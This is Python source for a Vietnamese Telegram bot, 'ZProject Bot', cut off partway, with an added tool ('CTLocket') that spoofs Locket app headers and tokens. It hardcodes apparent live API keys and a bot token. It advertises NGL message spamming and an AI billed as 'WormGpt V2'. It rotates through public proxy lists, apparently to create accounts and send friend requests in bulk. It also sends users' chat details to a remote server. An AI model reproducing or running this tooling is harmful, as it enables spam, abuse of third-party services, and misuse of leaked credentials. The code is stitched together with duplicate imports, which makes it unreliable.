import os
import time
import logging
import requests
import re
import base64
import uuid
import json
from datetime import datetime
from io import BytesIO
from PIL import Image # Đảm bảo Pillow được cài đặt nếu dùng chức năng ảnh
import random
import string
import threading # Thêm import này cho auto_delete_email và Locks
from telebot import types
from flask import Flask, request
from threading import Thread
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from types import SimpleNamespace

# --- Cấu hình logging ---
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)

# --- Cấu hình chung ---
# Lấy BOT_TOKEN từ biến môi trường, hoặc dùng giá trị mặc định nếu không có (chỉ để phát triển)
TOKEN = os.environ.get("BOT_TOKEN", "7539540916:AAENFBF2B2dyXLITmEC2ccgLYim2t9vxOQk") # THAY BẰNG TOKEN BOT CỦA BẠN
ADMIN_ID = int(os.environ.get("ADMIN_ID", 5819094246)) # THAY BẰNG ID ADMIN CỦA BẠN

# Đảm bảo APP_URL là URL thuần túy, không có Markdown
APP_URL = os.environ.get("APP_URL", "https://zproject-111.onrender.com") # THAY BẰNG URL APP CỦA BẠN

logging.info(f"APP_URL được cấu hình: {APP_URL}")

# THAY ĐỔI QUAN TRỌNG: BẬT CHẾ ĐỘ ĐA LUỒNG
bot = telebot.TeleBot(TOKEN, threaded=True) # <<< ĐÃ CHỈNH SỬA Ở ĐÂY
app = Flask(__name__)
START_TIME = time.time()

# Biến toàn cục và các Lock để bảo vệ truy cập đa luồng
USER_IDS = set()
GROUP_INFOS = []
user_data = {}
bot.feedback_messages = {}
bot.code_snippets = {}
bot.voice_map = {}
bot.mail_messages_state = {}
interaction_count = 0

# Khởi tạo Locks cho các biến dùng chung
user_data_lock = threading.Lock()
feedback_messages_lock = threading.Lock()
code_snippets_lock = threading.Lock()
voice_map_lock = threading.Lock()
mail_messages_state_lock = threading.Lock() # Thêm lock cho bot.mail_messages_state
interaction_count_lock = threading.Lock()
user_group_info_lock = threading.Lock()


# --- Cấu hình Requests với Retry và Timeout chung ---
session = requests.Session()
retries = Retry(total=3, backoff_factor=1, status_forcelist=[502, 503, 504])
adapter = HTTPAdapter(max_retries=retries)
session.mount("https://", adapter)
session.mount("http://", adapter)

DEFAULT_TIMEOUT_GLOBAL = 30 # Timeout mặc định cho các request khác
NGL_REQUEST_TIMEOUT = 15 # Timeout riêng cho NGL (có thể đặt ngắn hơn để bỏ qua nhanh)

# Ghi đè phương thức request để áp dụng timeout mặc định, nhưng NGL sẽ dùng timeout riêng
class TimeoutSession(requests.Session):
    def request(self, method, url, **kwargs):
        # Apply NGL_REQUEST_TIMEOUT if it's an NGL URL, otherwise use DEFAULT_TIMEOUT_GLOBAL
        if "zeusvr.x10.mx/ngl" in url:
            kwargs.setdefault('timeout', NGL_REQUEST_TIMEOUT)
        else:
            kwargs.setdefault('timeout', DEFAULT_TIMEOUT_GLOBAL)
        return super(TimeoutSession, self).request(method, url, **kwargs)

session = TimeoutSession()
session.mount("https://", adapter)
session.mount("http://", adapter)

# --- Cấu hình Gemini API và Prompt từ xa ---
GEMINI_API_KEY = "AIzaSyDpmTfFibDyskBHwekOADtstWsPUCbIrzE" # THAY BẰNG KHÓA API GEMINI CỦA BẠN
GEMINI_URL = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={GEMINI_API_KEY}"
REMOTE_PROMPT_URL = "https://zcode.x10.mx/prompt.json"
REMOTE_LOG_HOST = "https://zcode.x10.mx/save.php"

# --- URL ảnh dùng trong bot ---
NGL_SUCCESS_IMAGE_URL = "https://i.ibb.co/fV1srXJ8/9885878c-2a4b-4246-ae2e-fda17d735e2d.jpg"
START_IMAGE_URL = "https://i.ibb.co/MkQ2pTjv/ca68c4b2-60dc-4eb1-9a20-ebf2cc5c577f.jpg"
NOTI_IMAGE_URL = "https://i.ibb.co/QvrB4zMB/ca68c4b2-2a4b-4246-ae2e-fda17d735e2d.jpg"
TUONGTAC_IMAGE_URL = "https://i.ibb.co/YF4yRCBP/1751301092916.png"

# --- Các hàm Dummy (Cần thay thế bằng logic thực tế của bạn) ---
def load_user_memory(user_id):
    """Tải lịch sử trò chuyện của người dùng."""
    # Đây là hàm dummy, hãy thay thế bằng logic tải dữ liệu thực tế
    return []

def save_user_memory(user_id, memory):
    """Lưu lịch sử trò chuyện của người dùng."""
    # Đây là hàm dummy, hãy thay thế bằng logic lưu dữ liệu thực tế
    pass

def html_escape(text):
    """Định dạng văn bản thành HTML, tránh lỗi ký tự đặc biệt."""
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;").replace("'", "&#039;")

class gTTS:
    """Class dummy cho gTTS. Thay thế bằng thư viện gTTS thực tế nếu bạn muốn chức năng này hoạt động."""
    def __init__(self, text, lang="vi", slow=False):
        self.text = text
        self.lang = lang
        self.slow = slow
    def save(self, filename):
        logging.info(f"Dummy gTTS: Saving '{self.text[:50]}...' to {filename}")
        with open(filename, "wb") as f:
            f.write(b"dummy_audio_data")

# --- Các hàm hỗ trợ cho chức năng Mail.tm ---

# Tạo chuỗi ngẫu nhiên
def random_string(length=3):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# Tự động xóa email sau 10 phút
def auto_delete_email(user_id):
    time.sleep(600)  # 10 phút
    with user_data_lock: # Bảo vệ truy cập user_data
        if user_id in user_data:
            # THỰC HIỆN XÓA TÀI KHOẢN TRÊN MAIL.TM NẾU CÓ THỂ
            # Ví dụ (cần lưu account_id và token vào user_data khi tạo mail):
            # try:
            #     account_info = user_data[user_id]
            #     if 'account_id' in account_info and 'token' in account_info:
            #         headers = {"Authorization": f"Bearer {account_info['token']}"}
            #         session.delete(f"https://api.mail.tm/accounts/{account_info['account_id']}", headers=headers)
            #         logging.info(f"Đã xóa tài khoản Mail.tm: {account_info['email']}")
            # except Exception as e:
            #     logging.error(f"Lỗi khi xóa tài khoản Mail.tm cho user {user_id}: {e}")

            del user_data[user_id]
            send_message_robustly(user_id, "⏰ Mail 10 phút của bạn đã hết hạn!")

# Lấy domain có sẵn từ API mail.tm
def get_domain():
    # Sử dụng session đã cấu hình của ZProject bot
    try:
        r = session.get("https://api.mail.tm/domains")
        r.raise_for_status() # Kiểm tra lỗi HTTP
        domains = r.json()["hydra:member"]
        # Lọc các domain có isActive = True
        active_domains = [d for d in domains if d.get('isActive', False)]
        if active_domains:
            return random.choice(active_domains)["domain"] # Chọn ngẫu nhiên một domain
        return None
    except requests.exceptions.RequestException as e: # Bắt lỗi requests cụ thể
        logging.error(f"Lỗi khi lấy domain từ Mail.tm: {e}")
        return None
    except Exception as e: # Bắt các lỗi khác
        logging.error(f"Lỗi không xác định khi lấy domain từ Mail.tm: {e}")
        return None

# Đăng ký và lấy token
def create_temp_mail():
    domain = get_domain()
    if not domain:
        return None, None, None

    email = f"zproject_{random_string()}@{domain}"
    password = random_string(12)

    try:
        # Tạo tài khoản
        r_acc = session.post("https://api.mail.tm/accounts", json={
            "address": email,
            "password": password
        })
        r_acc.raise_for_status()

        # Đăng nhập để lấy token
        r_token = session.post("https://api.mail.tm/token", json={
            "address": email,
            "password": password
        })
        r_token.raise_for_status()

        token = r_token.json()['token']
        return email, password, token
    except Exception as e:
        logging.error(f"Lỗi khi tạo/đăng nhập mail.tm: {e}")
        return None, None, None

# Hàm xây dựng các nút cho Mail.tm
def build_mail_buttons(user_id, state):
    markup = InlineKeyboardMarkup()
    # Thêm user_id vào callback_data để kiểm tra quyền
    if state == 'mail_info':
        markup.row(InlineKeyboardButton("📩 Xem Hộp Thư", callback_data=f"mailtm_inbox|{user_id}"))
    elif state == 'inbox':
        markup.row(
            InlineKeyboardButton("🔄 Làm Mới", callback_data=f"mailtm_refresh|{user_id}"),
            InlineKeyboardButton("↩️ Quay Lại", callback_data=f"mailtm_back|{user_id}")
        )
    return markup


# === Đồng bộ nhóm/người dùng từ API ===
def sync_chat_to_server(chat):
    """Đồng bộ thông tin chat (người dùng/nhóm) lên server từ xa."""
    if chat.type not in ["private", "group", "supergroup"]:
        return
    try:
        payload = {
            "id": chat.id,
            "type": chat.type,
            "title": getattr(chat, "title", ""),
            "username": getattr(chat, "username", "")
        }
        response = session.post("https://zcode.x10.mx/apizproject.php", json=payload, timeout=DEFAULT_TIMEOUT_GLOBAL)
        response.raise_for_status()
        logging.info(f"Synced chat {chat.id} to server")
    except Exception as e:
        logging.error(f"Error syncing chat {chat.id}: {e}")

def update_id_list_loop():
    """Vòng lặp định kỳ để cập nhật danh sách người dùng và nhóm từ API."""
    global USER_IDS, GROUP_INFOS
    while True:
        try:
            response = session.get("https://zcode.x10.mx/group-idchat.json", timeout=DEFAULT_TIMEOUT_GLOBAL)
            response.raise_for_status()
            data = response.json()
            new_users = set(data.get("users", []))
            new_groups = data.get("groups", [])
            
            with user_group_info_lock: # Bảo vệ USER_IDS và GROUP_INFOS
                if new_users != USER_IDS or new_groups != GROUP_INFOS:
                    USER_IDS = new_users
                    GROUP_INFOS = new_groups
                    logging.info("Updated user and group lists")
        except Exception as e:
            logging.error(f"Error updating lists: {e}")
        time.sleep(10) # Đợi 30 giây trước khi cập nhật lại

# Khởi chạy luồng cập nhật ID
Thread(target=update_id_list_loop, daemon=True).start()

# --- Hàm hỗ trợ cho /ask và callbacks ---
def build_reply_button(user_id, question, reply_id=None):
    """Tạo các nút phản hồi cho tin nhắn /ask."""
    # Giới hạn độ dài của question để tránh lỗi callback_data quá dài
    safe_q = (re.sub(r"[^\w\s]", "", question.strip())[:50] + '...') if len(question.strip()) > 50 else question.strip()
    
    markup = InlineKeyboardMarkup()
    buttons = [
        InlineKeyboardButton("🔁 Trả lời lại", callback_data=f"retry|{user_id}|{safe_q}")
    ]
    if reply_id:
        buttons.append(InlineKeyboardButton("🔊 Chuyển sang Voice", callback_data=f"tts|{user_id}|{reply_id}"))
    markup.row(*buttons)
    return markup

# Decorator để tăng interaction_count cho mỗi lệnh
def increment_interaction_count(func):
    def wrapper(message, *args, **kwargs):
        global interaction_count
        with interaction_count_lock: # Sử dụng lock
            interaction_count += 1 # Tăng số lượt tương tác
        return func(message, *args, **kwargs)
    return wrapper

# Hàm gửi tin nhắn có xử lý lỗi reply_to_message_id
def send_message_robustly(chat_id, text=None, photo=None, caption=None, reply_markup=None, parse_mode="HTML", reply_to_message_id=None, disable_web_page_preview=None):
    try:
        if photo:
            return bot.send_photo(
                chat_id=chat_id,
                photo=photo,
                caption=caption,
                reply_markup=reply_markup,
                parse_mode=parse_mode,
                reply_to_message_id=reply_to_message_id
            )
        else:
            return bot.send_message(
                chat_id=chat_id,
                text=text,
                reply_markup=reply_markup,
                parse_mode=parse_mode,
                reply_to_message_id=reply_to_message_id,
                disable_web_page_preview=disable_web_page_preview
            )
    except telebot.apihelper.ApiTelegramException as e:
        if "message to be replied not found" in str(e):
            logging.warning(f"Failed to reply to message {reply_to_message_id} in chat {chat_id}: {e}. Sending as new message.")
            if photo:
                return bot.send_photo(
                    chat_id=chat_id,
                    photo=photo,
                    caption=caption,
                    reply_markup=reply_markup,
                    parse_mode=parse_mode
                )
            else:
                return bot.send_message(
                    chat_id=chat_id,
                    text=text,
                    reply_markup=reply_markup,
                    parse_mode=parse_mode,
                    disable_web_page_preview=disable_web_page_preview
                )
        else:
            logging.error(f"Error sending message to chat {chat_id}: {e}")
            raise

# === LỆNH XỬ LÝ TIN NHẮN ===


@bot.message_handler(commands=["start"])
@increment_interaction_count
def start_cmd(message):
    """Xử lý lệnh /start, hiển thị thông tin bot và các liên kết."""
    logging.info(f"Received /start from user {message.from_user.id} in chat {message.chat.id}") # Thêm log
    sync_chat_to_server(message.chat)
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("👤 Admin", url="https://t.me/zproject2"),
        InlineKeyboardButton("📢 Thông Báo", url="https://t.me/zproject3"),
        InlineKeyboardButton("💬 Chat", url="https://t.me/zproject4")
    )
    send_message_robustly(
        message.chat.id,
        photo=START_IMAGE_URL,
        caption="<b>🚀 ZProject Bot</b>\n\n"
                "Chào mừng bạn đến với Dịch Vụ Zproject Bot Được Make Bởi @zproject2\n "
                "● Chúng Tôi Có Các Dịch Vụ Như Treo Bot 24/7 Giá Cực Rẻ Hơn VPS và Máy Ảo \n● Bạn Có Thể Liên Hệ Telegram @zproject2.\n"
                "--> Gõ /phanhoi Để Phản Hồi Lỗi Hoặc Cần Cải Tiến Gì Đó Cho Bot, Ví Dụ <code>/phanhoi Lỗi Ở Lệnh Ask 503.</code>\n"
                "--> Gõ /help để xem danh sách các lệnh.",
        reply_markup=markup,
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )

@bot.message_handler(commands=["help"])
@increment_interaction_count
def help_command(message):
    """Xử lý lệnh /help, hiển thị menu các lệnh."""
    logging.info(f"Received /help from user {message.from_user.id} in chat {message.chat.id}") # Thêm log
    sync_chat_to_server(message.chat)
    help_text = (
        "<i>📚 Menu Lệnh ZProject Bot</i>\n\n"
        "•  <code>/start</code> - Start Zproject Bot.\n"
        "•  <code>/help</code>  - Show Menu Zproject Bot.\n"
        "•  <code>/time</code>  - Uptime Zproject Bot.\n"
        "•  <code>/ask &lt;câu hỏi&gt;</code> - Hỏi AI Được Tích Hợp WormGpt V2.\n"
        "•  <code>/ngl &lt;username&gt; &lt;tin_nhắn&gt; &lt;số_lần&gt;</code> - Spam Ngl.\n"
        "•  <code>/noti &lt;nội dung&gt;</code> - <i>(Chỉ Admin)</i> Gửi thông báo.\n"
        "•  <code>/sever</code> - <i>(Chỉ Admin)</i> Sever Bot.\n"
        "•  <code>/tuongtac</code> - Xem tổng số lượt tương tác của bot.\n"
        "•  <code>/phanhoi</code> - Gửi Phản Hồi Lỗi Hoặc Chức Năng Cần Cải Tiến.\n"
        "•  <code>/ping</code> - Xem Ping Sever Bot.\n"
        "•  <code>/mail10p</code> - Tạo mail 10 phút dùng 1 lần.\n"
        "•  <code>/hopthu</code> - Xem hộp thư của mail 10 phút đã tạo.\n"
        "•  <code>/xoamail10p</code> - Xóa mail 10 phút hiện tại của bạn." # Thêm lệnh mới
    )
    send_message_robustly(
        chat_id=message.chat.id,
        photo=NGL_SUCCESS_IMAGE_URL,
        caption=help_text,
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import sys
import subprocess
import os, re, time, json, queue, string, random, threading, datetime
from queue import Queue
from itertools import cycle
from urllib.parse import urlparse, parse_qs, urlencode
import requests, urllib3
from requests.exceptions import ProxyError
from colorama import init, Back, Style
from typing import Optional, List

# --- Các hàm và lớp từ CTLocket Tool Pro ---
# Vui lòng dán toàn bộ các hàm và lớp sau vào đây, TRỪ phần if __name__ == "__main__": và _install_():
# - class xColor
# - class CTLocket (có điều chỉnh nhỏ ở __init__ và _print)
# - Các hàm ngoài lớp như _print, _loader_, _sequence_, _randchar_, _blinking_, _rand_str_, _rand_name_, _rand_email_, _rand_pw_, _clear_, typing_print, _matrix_, _banner_, _stats_, load_proxies, init_proxy, format_proxy, get_proxy, excute, step1b_sign_in, step2_finalize_user, step3_send_friend_request, _cd_

# === Dán toàn bộ code từ dòng "class xColor:" đến hết hàm "_cd_" vào đây ===
class xColor:
    YELLOW='\033[38;2;255;223;15m'
    GREEN='\033[38;2;0;209;35m'
    RED='\033[38;2;255;0;0m'
    BLUE='\033[38;2;0;132;255m'
    PURPLE='\033[38;2;170;0;255m'
    PINK='\033[38;2;255;0;170m'
    MAGENTA='\033[38;2;255;0;255m'
    ORANGE='\033[38;2;255;132;0m'
    CYAN='\033[38;2;0;255;255m'
    PASTEL_YELLOW='\033[38;2;255;255;153m'
    PASTEL_GREEN='\033[38;2;153;255;153m'
    PASTEL_BLUE='\033[38;2;153;204;255m'
    PASTEL_PINK='\033[38;2;255;153;204m'
    PASTEL_PURPLE='\033[38;2;204;153;255m'
    DARK_RED='\033[38;2;139;0;0m'
    DARK_GREEN='\033[38;2;0;100;0m'
    DARK_BLUE='\033[38;2;0;0;139m'
    DARK_PURPLE='\033[38;2;75;0;130m'
    GOLD='\033[38;2;255;215;0m'
    SILVER='\033[38;2;192;192;192m'
    BRONZE='\033[38;2;205;127;50m'
    NEON_GREEN='\033[38;2;57;255;20m'
    NEON_PINK='\033[38;2;255;20;147m'
    NEON_BLUE='\033[38;2;31;81;255m'
    WHITE='\033[38;2;255;255;255m'
    RESET='\033[0m'
class CTLocket:
    def __init__(self, device_token: str="", target_friend_uid: str="", num_threads: int=1, note_target: str=""):
        self.FIREBASE_GMPID="1:641029076083:ios:cc8eb46290d69b234fa606"
        self.IOS_BUNDLE_ID="com.locket.Locket"
        self.API_BASE_URL="https://api.locketcamera.com"
        self.FIREBASE_AUTH_URL="https://www.googleapis.com/identitytoolkit/v3/relyingparty"
        self.FIREBASE_API_KEY="AIzaSyCQngaaXQIfJaH0aS2l7REgIjD7nL431So"
        self.TOKEN_API_URL="http://spyderxapi.x10.mx/locket/v2/api/token.php"
        self.SHORT_URL="https://url.thanhdieu.com/api/v1"
        self.TOKEN_FILE_PATH="token.json"
        self.TOKEN_EXPIRY_TIME=(20 + 10) * 60
        self.FIREBASE_APP_CHECK=None
        self.USE_EMOJI=True
        self.ACCOUNTS_PER_PROXY=random.randint(6,10)
        self.NAME_TOOL="Zproject Bot"
        self.VERSION_TOOL="v1.2"
        self.TARGET_FRIEND_UID=target_friend_uid if target_friend_uid else None
        self.PROXY_LIST = [
    # ===== GitHub Proxy HTTP Raw Links =====
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://thanhdieu.com/api/list/proxyv3.txt',
    'https://vakhov.github.io/fresh-proxy-list/http.txt',
    'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS.txt',
    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list/http.txt',
    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list/http_highanon.txt',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
    'https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt',
    'https://raw.githubusercontent.com/almroot/proxylist/main/http.txt',
    'https://raw.githubusercontent.com/hookzof/socks5_list/master/http.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-elite.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/elite.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/https.txt',
    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt',
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/socks4.txt',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt',

    # ===== GitLab Proxy HTTP Raw Links =====
    'https://gitlab.com/roosterkid/openproxylist/-/raw/main/HTTPS.txt',
    'https://gitlab.com/monosans/proxy-list/-/raw/main/http.txt',
    'https://gitlab.com/monosans/proxy-list/-/raw/main/elite.txt',
    'https://gitlab.com/almroot/proxylist/-/raw/main/http.txt',
    'https://gitlab.com/mertguvencli/http-proxy-list/-/raw/main/proxy-list/data.txt',
    'https://gitlab.com/almroot/proxylist/-/raw/main/https.txt',
    'https://gitlab.com/monosans/proxy-list/-/raw/main/https.txt',
    'https://gitlab.com/mertguvencli/http-proxy-list/-/raw/main/proxy-list/https.txt',
    'https://gitlab.com/monosans/proxy-list/-/raw/main/socks4.txt',
    'https://gitlab.com/monosans/proxy-list/-/raw/main/socks5.txt',
]
        self.print_lock=threading.Lock()
        self.successful_requests=0
        self.failed_requests=0
        self.total_proxies=0
        self.start_time=time.time()
        self.spam_confirmed=False
        self.discord='discord.gg/VM7ESrzccs'
        self.author='Nguyễn Minh Nhật'
        self.messages=[]
        self.request_timeout=15
        self.device_token=device_token
        self.num_threads=num_threads
        self.note_target=note_target
        self.session_id=int(time.time() * 1000)
        self._init_environment()
        self.FIREBASE_APP_CHECK=self._load_token_()
        if os.name == "nt":
            os.system(
                f"title 💰 {self.NAME_TOOL} {self.VERSION_TOOL} by Nguyen Minh Nhat 💰"
         )
    def _print(self, *args, **kwargs):
        # Đây là hàm print nội bộ, có thể bỏ qua hoặc điều chỉnh để không in ra console nếu chỉ chạy bot
        # Trong bot Telegram, chúng ta sẽ gửi tin nhắn trực tiếp thay vì in
        pass
    def _loader_(self, message, duration=3):
        pass
    def _sequence_(self, message, duration=1.5, char_set="0123456789ABCDEF"):
        pass
    def _randchar_(self, duration=2):
        pass
    def _blinking_(self, text, blinks=3, delay=0.1):
        pass
    def _init_environment(self):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        init(autoreset=True)
    def _load_token_(self):
        try:
            if not os.path.exists(self.TOKEN_FILE_PATH):
                return self.fetch_token()
            # self._loader_( # Bỏ qua loader khi chạy bot
            #     f"{xColor.YELLOW}Verifying token integrity{Style.RESET_ALL}", 0.5)
            with open(self.TOKEN_FILE_PATH, 'r') as file:
                token_data=json.load(file)
            if 'token' in token_data and 'expiry' in token_data:
                if token_data['expiry'] > time.time():
                    # self._print( # Bỏ qua print khi chạy bot
                    #     f"{xColor.GREEN}[+] {xColor.CYAN}Loaded token from file token.json: {xColor.YELLOW}{token_data['token'][:10] + "..." + token_data['token'][-10:]}")
                    # time.sleep(0.4)
                    # time_left=int(token_data['expiry'] - time.time())
                    # self._print(
                    #     f"{xColor.GREEN}[+] {xColor.CYAN}Token expires in: {xColor.WHITE}{time_left//60} minutes {time_left % 60} seconds")
                    return token_data['token']
                else:
                    # self._print( # Bỏ qua print khi chạy bot
                    #     f"{xColor.RED}[!]{xColor.RED} Locket token expired, trying to fetch new token")
                    pass
            return self.fetch_token()
        except Exception as e:
            # self._print( # Bỏ qua print khi chạy bot
            #     f"{xColor.RED}[!] {xColor.YELLOW}Error loading token from file: {str(e)}")
            return self.fetch_token()
    def save_token(self, token):
        try:
            token_data={
                'token': token,
                'expiry': time.time() + self.TOKEN_EXPIRY_TIME,
                'created_at': time.time()
            }
            with open(self.TOKEN_FILE_PATH, 'w') as file:
                json.dump(token_data, file, indent=4)

            # self._print( # Bỏ qua print khi chạy bot
            #     f"{xColor.GREEN}[+] {xColor.CYAN}Token saved to {xColor.WHITE}{self.TOKEN_FILE_PATH}")
            return True
        except Exception as e:
            # self._print( # Bỏ qua print khi chạy bot
            #     f"{xColor.RED}[!] {xColor.YELLOW}Error saving token to file: {str(e)}")
            return False
    def fetch_token(self, retry=0, max_retries=3):
        if retry == 0:
            # self._print( # Bỏ qua print khi chạy bot
            #     f"{xColor.MAGENTA}[*] {xColor.CYAN}Initializing token authentication sequence")
            # self._loader_("Establishing secure connection", 1)
            pass
        if retry >= max_retries:
            # self._print( # Bỏ qua print khi chạy bot
            #     f"{xColor.RED}[!] {xColor.YELLOW}Token acquisition failed after {max_retries} attempts")
            # self._loader_("Emergency shutdown", 1)
            # sys.exit(1)
            return None # Trả về None để bot xử lý
        try:
            # self._print( # Bỏ qua print khi chạy bot
            #     f"{xColor.MAGENTA}[*] {xColor.CYAN}Preparing to retrieve token [{retry+1}/{max_retries}]")
            response=requests.get(self.TOKEN_API_URL, timeout=self.request_timeout, proxies={
                                    "http": None, "https": None})
            response.raise_for_status()
            data=response.json()
            if not isinstance(data, dict):
                # self._print( # Bỏ qua print khi chạy bot
                #     f"{xColor.YELLOW}[!] {xColor.WHITE}Invalid response format, retrying...")
                time.sleep(0.5)
                return self.fetch_token(retry + 1)
            if data.get("code") == 200 and "data" in data and "token" in data["data"]:
                token=data["data"]["token"]
                # self._print( # Bỏ qua print khi chạy bot
                #     f"{xColor.GREEN}[+] {xColor.CYAN}Token acquired successfully")
                # masked_token=token[:10] + "..." + token[-10:]
                # self._print(
                #     f"{xColor.GREEN}[+] {xColor.WHITE}Token: {xColor.YELLOW}{masked_token}")
                self.save_token(token)
                return token
            elif data.get("code") in (403, 404, 502, 503, 504, 429, 500):
                # self._print( # Bỏ qua print khi chạy bot
                #     f"{xColor.YELLOW}[!] {xColor.RED}The Locket token server is no longer available, please contact us discord @{self.discord}, trying again...")
                time.sleep(1.3)
                return self.fetch_token(retry + 1)
            else:
                # self._print( # Bỏ qua print khi chạy bot
                #     f"{xColor.YELLOW}[!] {xColor.RED}{data.get("msg")}")
                time.sleep(1.3)
                return self.fetch_token(retry + 1)
        except requests.exceptions.RequestException as e:
            # self._print( # Bỏ qua print khi chạy bot
            #     f"{xColor.RED}[!] Warning: {xColor.YELLOW}Token unauthorized, retrying... {e}")
            # self._loader_("Attempting to reconnect", 1)
            time.sleep(1.3)
            return self.fetch_token(retry + 1)
    def headers_locket(self):
        return {
            'Host': 'api.locketcamera.com',
            'Accept': '*/*',
            'baggage': 'sentry-environment=production,sentry-public_key=78fa64317f434fd89d9cc728dd168f50,sentry-release=com.locket.Locket%401.121.1%2B1,sentry-trace_id=2cdda588ea0041ed93d052932b127a3e',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'Accept-Language': 'vi-VN,vi;q=0.9',
            'sentry-trace': '2cdda588ea0041ed93d052932b127a3e-a3e2ba7a095d4f9d-0',
            'User-Agent': 'com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1',
            'Firebase-Instance-ID-Token': 'd7ChZwJHhEtsluXwXxbjmj:APA91bFoMIgxwf-2tmY9QLy82lKMEWL6S4d8vb9ctY3JxLLTQB1k6312TcgtqJjWFhQVz_J4wIFvE0Kfroztu1vbZDOFc65s0vvj68lNJM4XuJg1onEODiBG3r7YGrQLiHkBV1gEoJ5f',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
        }
    def firebase_headers_locket(self):
        base_headers=self.headers_locket()
        return {
            'Host': 'www.googleapis.com',
            'baggage': base_headers.get('baggage', ''),
            'Accept': '*/*',
            'X-Client-Version': 'iOS/FirebaseSDK/10.23.1/FirebaseCore-iOS',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'X-Ios-Bundle-Identifier': self.IOS_BUNDLE_ID,
            'X-Firebase-GMPID': '1:641029076083:ios:cc8eb46290d69b234fa606',
            'X-Firebase-Client': 'H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA',
            'sentry-trace': base_headers.get('sentry-trace', ''),
            'Accept-Language': 'vi',
            'User-Agent': 'FirebaseAuth.iOS/10.23.1 com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1',
            'Connection': 'keep-alive',
            'X-Firebase-GMPID': self.FIREBASE_GMPID,
            'Content-Type': 'application/json',
        }
    def analytics_payload(self):
        return {
            "platform": "ios",
            "experiments": {
                "flag_4": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "43",
                },
                "flag_10": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "505",
                },
                "flag_6": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "2000",
                },
                "flag_3": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "501",
                },
                "flag_22": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "1203",
                },
                "flag_18": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "1203",
                },
                "flag_17": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "1010",
                },
                "flag_16": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "303",
                },
                "flag_15": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "501",
                },
                "flag_14": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "551",
                },
                "flag_25": {
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                    "value": "23",
                },
            },
            "amplitude": {
                "device_id": "57A54C21-B633-418C-A6E3-4201E631178C",
                "session_id": {
                    "value": str(self.session_id),
                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
                },
            },
            "google_analytics": {"app_instance_id": "7E17CEB525FA4471BD6AA9CEC2C1BCB8"},
            "ios_version": "1.121.1.1",
        }
    def excute(self, url, headers=None, payload=None, thread_id=None, step=None, proxies_dict=None):
        # Không dùng prefix màu mè console trong bot, mà log ra file hoặc console đơn giản
        try:
            response=requests.post(
                url,
                headers=headers or self.headers_locket(),
                json=payload,
                proxies=proxies_dict,
                timeout=self.request_timeout,
                verify=False
            )
            response.raise_for_status()
            self.successful_requests+=1
            return response.json() if response.content else True
        except ProxyError:
            # self._print(f"[!] Proxy connection terminated") # Không print console trong bot
            self.failed_requests+=1
            return "proxy_dead"
        except requests.exceptions.RequestException as e:
            self.failed_requests+=1
            if hasattr(e, 'response') and e.response is not None:
                status_code=e.response.status_code
                try:
                    error_data=e.response.json()
                    error_msg=error_data.get(
                        'error', 'Remote server rejected request')
